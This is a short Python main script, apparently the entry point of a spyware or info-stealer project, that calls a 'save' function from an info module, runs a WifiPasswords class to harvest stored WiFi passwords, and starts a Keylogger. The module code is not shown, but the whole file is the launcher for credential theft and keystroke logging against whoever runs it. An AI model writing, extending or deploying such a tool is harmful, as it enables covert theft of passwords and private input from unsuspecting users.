from modules.info import save
from modules.wifi import WifiPasswords
from modules.keylogger import Keylogger


save()

wifi = WifiPasswords()
wifi.run()

Logger = Keylogger()
Logger.run()
